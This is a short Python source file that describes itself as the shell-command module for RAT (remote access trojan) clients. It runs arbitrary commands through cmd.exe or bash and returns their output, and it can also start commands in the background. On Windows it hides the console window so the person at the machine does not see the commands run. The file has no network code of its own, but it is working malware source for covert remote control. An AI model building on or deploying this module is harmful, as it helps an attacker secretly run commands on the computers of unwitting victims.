#!/usr/bin/env python3
"""Command execution module — shell command execution for RAT clients."""
import subprocess
import os
import sys
import platform

def execute(cmd, timeout=60):
    """Execute a shell command and return stdout+stderr."""
    is_win = platform.system() == "Windows"
    try:
        if is_win:
            p = subprocess.run(
                ["cmd.exe", "/c", cmd],
                capture_output=True, timeout=timeout,
                creationflags=0x08000000  # CREATE_NO_WINDOW
            )
        else:
            p = subprocess.run(
                ["/bin/bash", "-c", cmd],
                capture_output=True, timeout=timeout
            )
        result = p.stdout + p.stderr
        return result if result else b"(no output)"
    except subprocess.TimeoutExpired:
        return b"error: command timed out"
    except Exception as e:
        return f"error: {e}".encode()

def execute_background(cmd):
    """Execute a command in the background (no output)."""
    is_win = platform.system() == "Windows"
    try:
        if is_win:
            subprocess.Popen(
                ["cmd.exe", "/c", cmd],
                creationflags=0x08000000,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                ["/bin/bash", "-c", cmd],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        return b"ok: background process started"
    except Exception as e:
        return f"error: {e}".encode()
